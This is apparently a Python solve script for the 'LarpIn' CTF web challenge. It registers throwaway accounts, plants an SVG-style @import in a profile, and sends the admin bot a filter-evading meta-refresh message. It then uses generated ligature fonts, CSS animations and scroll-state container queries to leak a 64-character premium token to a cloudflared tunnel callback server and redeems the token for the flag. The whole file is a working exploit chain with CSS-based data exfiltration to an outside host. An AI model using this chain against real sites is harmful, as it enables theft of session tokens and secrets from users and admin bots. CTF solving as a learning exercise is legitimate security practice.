#!/usr/bin/env python3
"""
LarpIn. CSS-only exfil of a 64-char premium token out of the reviewer bot,
using font-weight as a stage selector so one page load reads every character
position.
"""
import http.server
import itertools
import json
import os
import random
import re
import string
import subprocess
import sys
import threading
import time
import urllib.parse

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scratch"))
import mkfont3 as mf  # noqa: E402

PORT = int(os.environ.get("PORT", "8896"))
URLFILE = os.path.expanduser("~/ctf-tools/LARPIN_URL.txt")
STATEF = os.path.join(HERE, "state.json")
CLOUDFLARED = os.path.expanduser("~/ctf-tools/bin/cloudflared")

ADMIN_ID = "1"
JOB = os.environ.get("JOB", "1")
PASSWORD = "Passw0rd!23"

ALPHA = list(os.environ.get("ALPHA", "0123456789abcdef"))
FULL = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-")
OFF = 4                       # empty lead buckets: reject font-load artifacts
STEP = 600
FS = 16
LEAD = float(os.environ.get("LEAD", "2.5"))
FRAME = float(os.environ.get("FRAME", "0.034"))     # >= 2 vsyncs at 60 Hz
MAXLEN = 192
CTXLEN = int(os.environ.get("CTXLEN", "6"))   # bounded ligature context.
# The context must be unique inside the element's text, and it prefixes every
# enumerated continuation, so its length multiplies the font size:
# 65536 rules x (4 + 2*(CTXLEN+3)) bytes. Six hex characters collide with
# probability ~58/16^6 in a 64-char token, and a collision announces itself
# because the advances sum out of range.

TOK_SEL = "script#viewer-premium-token"
CFG_SEL = "script:not([src]):not([type])"
CFG_PREFIX = 'premiumToken: "'

STATE = {"hits": {}, "css": {}}
LOCK = threading.Lock()


def log(*a):
    print(time.strftime("[%H:%M:%S]", time.gmtime()), *a, flush=True)


def target():
    t = os.environ.get("CTF_TARGET")
    if t:
        return t.rstrip("/")
    d = json.load(open(URLFILE))["deploymentName"]
    return "https://%s.challs.ctf.thefewchosen.com" % d


def load():
    if os.path.exists(STATEF):
        return json.load(open(STATEF))
    return {"known": "", "length": None, "host": None}


def save(st):
    tmp = STATEF + ".tmp"
    json.dump(st, open(tmp, "w"), indent=1)
    os.replace(tmp, STATEF)


# --------------------------------------------------------------------------- css
def sweep(cb, tag, sel, font_uri, nbuckets, var, step):
    """Walk sel's width down through nbuckets+1 thresholds.  The first frame at
    which the element overflows names the ligature advance, hence the bucket."""
    upx = step * FS / 1000.0
    frames = nbuckets + 1
    total = LEAD + FRAME * frames
    w0 = (nbuckets + 1.5) * upx
    segw = ["0%%,%.5f%%{width:%.3fpx}" % (100.0 * LEAD / total - 0.0005, w0)]
    segu = ['0%%,%.5f%%{%s:url("data:,")}' % (100.0 * LEAD / total - 0.0005, var)]
    for j in range(frames):
        a = 100.0 * (LEAD + FRAME * j) / total
        b = 100.0 * (LEAD + FRAME * (j + 1)) / total - 0.0005
        w = max((nbuckets - j + 0.5) * upx, 1.5)
        segw.append("%.5f%%,%.5f%%{width:%.3fpx}" % (a, b, w))
        segu.append('%.5f%%,%.5f%%{%s:url("%s/h/%s/%d")}' % (a, b, var, cb, tag, j))
    return """@property %(var)s{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@font-face{font-family:G%(tag)s;src:url(%(font)s)}
@keyframes w%(tag)s{%(segw)s}
@keyframes u%(tag)s{%(segu)s}
%(sel)s{display:block!important;font-family:G%(tag)s!important;font-size:%(fs)dpx!important;
line-height:%(fs)dpx!important;white-space:pre!important;overflow-x:auto!important;
overflow-y:hidden!important;height:%(h)dpx!important;
font-variant-ligatures:common-ligatures!important;
container-type:scroll-state!important;color:transparent!important;
animation:w%(tag)s %(total).2fs steps(1,end) 1 both!important}
%(sel)s::after{content:""!important;display:block!important;width:1px!important;
height:1px!important;background-image:none;
animation:u%(tag)s %(total).2fs steps(1,end) 1 both!important}
@container scroll-state(scrollable: right){%(sel)s::after{background-image:var(%(var)s)}}
""" % {"tag": tag, "font": font_uri, "segw": "".join(segw), "segu": "".join(segu),
       "sel": sel, "fs": FS, "h": FS * 3, "total": total, "var": var}


def tick(cb, tag, total, n=16):
    seg = []
    for j in range(n):
        a = 100.0 * j / n
        b = 100.0 * (j + 1) / n - 0.0005
        seg.append('%.5f%%,%.5f%%{--v:url("%s/k/%s/%d")}' % (a, b, cb, tag, j))
    return """@property --v{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@keyframes k%(tag)s{%(seg)s}
html{background-image:url("%(cb)s/k/%(tag)s/ready")}
body::before{content:""!important;display:block!important;width:2px!important;
height:2px!important;background-image:var(--v);
animation:k%(tag)s %(total).2fs steps(1,end) 1 both!important}
""" % {"tag": tag, "seg": "".join(seg), "cb": cb, "total": total}


# ------------------------------------------------------------------------ server
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parts = urllib.parse.urlparse(self.path).path.strip("/").split("/")
        if parts[0] in ("h", "k") and len(parts) >= 3:
            with LOCK:
                STATE["hits"].setdefault(parts[1], []).append(
                    (parts[0], "/".join(parts[2:]), round(time.time(), 2)))
            return self._send(b"", "image/gif")
        if parts[0] == "c" and len(parts) >= 2:
            with LOCK:
                body = STATE["css"].get(parts[1].replace(".css", ""), "/*x*/").encode()
            return self._send(body, "text/css")
        self._send(b"ok", "text/plain")


class TS(http.server.ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def start_tunnel(port):
    p = subprocess.Popen([CLOUDFLARED, "tunnel", "--url",
                          "http://127.0.0.1:%d" % port, "--no-autoupdate"],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url, t0 = None, time.time()
    while time.time() - t0 < 90:
        line = p.stdout.readline()
        if not line:
            break
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    threading.Thread(target=lambda: [x for x in p.stdout], daemon=True).start()
    return p, url


# ------------------------------------------------------------------------ target
class Client:
    def __init__(self, base):
        self.base, self.s = base, requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0"

    def req(self, m, p, **kw):
        kw.setdefault("allow_redirects", False)
        kw.setdefault("timeout", 25)
        last = None
        for _ in range(6):
            try:
                return self.s.request(m, self.base + p, **kw)
            except Exception as e:  # noqa: BLE001
                last = e
                time.sleep(0.8)
        raise last


def fire(cb, tag, base):
    u = "z" + "".join(random.choice(string.ascii_lowercase + string.digits)
                      for _ in range(9))
    c = Client(base)
    c.req("POST", "/auth", data={"action": "register", "username": u,
                                 "full_name": u, "password": PASSWORD})
    r = c.req("POST", "/auth", data={"action": "login", "username": u,
                                     "password": PASSWORD})
    assert r.status_code == 302, r.status_code
    about = '<svg><style>@import url("%s/c/%s.css");</style></svg>' % (cb, tag)
    c.req("POST", "/profile/edit", data={"full_name": u, "headline": "SWE",
                                         "about": about, "experience": "x",
                                         "education": "x"})
    dm = '<met<meta zz>a http-equiv=refresh content<meta q>="0;url=/profile/%s">' % u
    c.req("POST", "/messages", data={"receiver_id": ADMIN_ID, "content": dm})
    c.req("POST", "/jobs/%s/apply" % JOB,
          data={"cover_letter": "Please review my profile."},
          files={"resume": ("cv.txt", b"hire me", "text/plain")})
    return u


def wait(tags, timeout=200, quiet=7.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        with LOCK:
            hs = [h for t in tags for h in STATE["hits"].get(t, [])]
        if hs and time.time() - max(h[2] for h in hs) > quiet:
            break
        time.sleep(0.5)
    with LOCK:
        return {t: list(STATE["hits"].get(t, [])) for t in tags}


def firstj(hs):
    js = [int(v) for k, v, _ in hs if k == "h" and v.isdigit()]
    return min(js) if js else None


# ------------------------------------------------------------------------- probes
def pair_rules(ctx, alpha, depth):
    """Enumerate alpha^depth continuations of ctx; the bucket encodes the LAST
    two characters, so one element resolves two positions at depth-2 cost."""
    rules = []
    for combo in itertools.product(alpha, repeat=depth):
        k = alpha.index(combo[-2]) * len(alpha) + alpha.index(combo[-1])
        rules.append((ctx + "".join(combo), OFF + k))
    return rules, OFF + len(alpha) ** 2


def one_rules(ctx, alpha, depth):
    rules = []
    for combo in itertools.product(alpha, repeat=depth):
        rules.append((ctx + "".join(combo), OFF + alpha.index(combo[-1])))
    return rules, OFF + len(alpha)


def decode_pair(j, n, alpha):
    if j is None:
        return None
    k = n - j - OFF
    if not (0 <= k < len(alpha) ** 2):
        return None
    return alpha[k // len(alpha)] + alpha[k % len(alpha)]


def decode_one(j, n, alpha):
    if j is None:
        return None
    k = n - j - OFF
    return alpha[k] if 0 <= k < len(alpha) else None


def staged_main(cb):
    """One bot visit resolves every still-unknown position at once."""
    import stage
    base = target()
    log("target", base)
    alpha = "".join(ALPHA)
    st = load()
    if st.get("host") != base:
        log("new host, resetting state")
        st = {"host": base, "length": 64, "tok": [None] * 64}
        save(st)
    st.setdefault("tok", [None] * 64)
    t_start = time.time()
    for attempt in range(8):
        todo = [i for i, c in enumerate(st["tok"]) if c is None]
        if not todo:
            break
        todo = todo[:64]
        tag = "S%d" % (int(time.time() * 10) % 10 ** 8)
        css, total, nb = stage.build(cb, tag, CFG_SEL, CFG_PREFIX, todo, alpha)
        css += stage.clock(cb, tag, total)
        with LOCK:
            STATE["css"][tag] = css
        u = fire(cb, tag, base)
        log("visit %d: %d positions, css %dKB, animation %.1fs, user %s"
            % (attempt, len(todo), len(css) // 1024, total, u))
        hs = wait([tag], timeout=400, quiet=12.0)[tag]
        got = stage.decode(hs, tag, len(todo), nb, alpha)
        n = 0
        for k, p in enumerate(todo):
            if got[k] is not None:
                st["tok"][p] = got[k]
                n += 1
        save(st)
        clk = [int(v) for kk, v, _ in hs if kk == "k" and v.isdigit()]
        log("   +%d positions (clock %s/19), have %d/64: %s"
            % (n, max(clk) if clk else None,
               sum(1 for c in st["tok"] if c), "".join(c or "?" for c in st["tok"])))
        if n == 0:
            log("   nothing decoded, retrying")
    tok = "".join(c or "?" for c in st["tok"])
    log("TOKEN: %s  (%.0fs elapsed)" % (tok, time.time() - t_start))
    if "?" not in tok:
        redeem(base, tok)
    return tok


def build_round(cb, tA, tB, known, alpha):
    """Returns (css, decoders).  decoders: list of (tag, n, kind, offset)."""
    css, dec = "", []
    maxd = 0
    if len(known) >= 5:
        ctxA = known[-CTXLEN:]
        rA, nA = pair_rules(ctxA, alpha, 2)
        stepA = mf.auto_step(nA, STEP)
        css += sweep(cb, tA, TOK_SEL, mf.data_uri(mf.build(rA, nA, step=stepA)),
                     nA, "--u1", stepA)
        dec.append((tA, nA, "pair", 0))
        maxd = nA
        ctxB, depthB = known[-CTXLEN:], 4
    else:
        ctxB, depthB = CFG_PREFIX + known, 2
    rB, nB = pair_rules(ctxB, alpha, depthB)
    stepB = mf.auto_step(nB, STEP)
    css += sweep(cb, tB, CFG_SEL, mf.data_uri(mf.build(rB, nB, step=stepB)),
                 nB, "--u2", stepB)
    dec.append((tB, nB, "pair", depthB - 2))
    total = LEAD + FRAME * (max(maxd, nB) + 1)
    css += tick(cb, tA, total)
    return css, dec, total


def main():
    srv = TS(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    proc, cb = start_tunnel(PORT)
    if not cb:
        raise SystemExit("no tunnel")
    log("callback", cb)
    time.sleep(4)
    if not os.environ.get("LEGACY"):
        return staged_main(cb)
    base = target()
    log("target", base)
    alpha = ALPHA
    st = load()
    if st.get("host") != base:
        log("new host, resetting state")
        st = {"known": "", "length": 64, "host": base}
        save(st)
    t_start = time.time()
    fails = 0
    while len(st["known"]) < st["length"]:
        known = st["known"]
        ts = "%d" % (int(time.time() * 10) % 10 ** 8)
        tA, tB = "A" + ts, "B" + ts
        t0 = time.time()
        css, dec, total = build_round(cb, tA, tB, known, alpha)
        with LOCK:
            STATE["css"][tA] = css
            STATE["css"][tB] = css
        u = fire(cb, tA, base)
        log("round known=%d/%d css=%dKB dwell=%.1fs user=%s"
            % (len(known), st["length"], len(css) // 1024, total, u))
        hs = wait([tA, tB])
        ticks = [int(v) for k, v, _ in hs[tA] if k == "k" and v.isdigit()]
        got = ""
        for tag, n, kind, off in dec:
            j = firstj(hs[tag])
            v = decode_pair(j, n, alpha)
            log("   %s j=%s -> %r" % (tag[0], j, v))
            if v is None:
                break
            got += v
        if not got:
            fails += 1
            log("   no read (ticks %s), fail %d" % (max(ticks) if ticks else None, fails))
            if fails >= 3:
                log("   three consecutive misses, aborting")
                break
            continue
        fails = 0
        st["known"] = known + got
        st["known"] = st["known"][:st["length"]]
        save(st)
        log("   +%s  %d/%d  %s  (%.0fs elapsed)"
            % (got, len(st["known"]), st["length"], st["known"], time.time() - t_start))
    log("TOKEN:", st["known"])
    if len(st["known"]) == st["length"]:
        redeem(base, st["known"])


def redeem(base, token):
    c = Client(base)
    u = "w" + "".join(random.choice(string.ascii_lowercase) for _ in range(9))
    c.req("POST", "/auth", data={"action": "register", "username": u,
                                 "full_name": u, "password": PASSWORD})
    c.req("POST", "/auth", data={"action": "login", "username": u,
                                 "password": PASSWORD})
    r = c.req("POST", "/premium/activate", data={"token": token},
              allow_redirects=True)
    log("activate", r.status_code, "Invalid" in r.text)
    out = r.text
    for p in ("/premium", "/feed", "/profile/" + u):
        out += c.req("GET", p, allow_redirects=True).text
    m = re.search(r"TFCCTF\{[^}]*\}", out)
    log("FLAG:", m.group(0) if m else "not in response")
    open(os.path.join(HERE, "flag.txt"), "w").write(m.group(0) if m else "")


if __name__ == "__main__":
    main()
